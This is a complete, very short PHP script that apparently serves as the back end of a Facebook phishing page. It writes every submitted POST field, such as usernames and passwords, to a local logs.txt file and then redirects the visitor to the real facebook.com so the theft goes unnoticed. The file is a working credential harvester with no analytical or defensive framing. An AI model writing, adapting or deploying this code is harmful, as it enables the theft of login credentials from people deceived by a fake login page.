<?php
header ('Location: https://facebook.com');
$handle = fopen("logs.txt", "a");

foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);


exit;
?>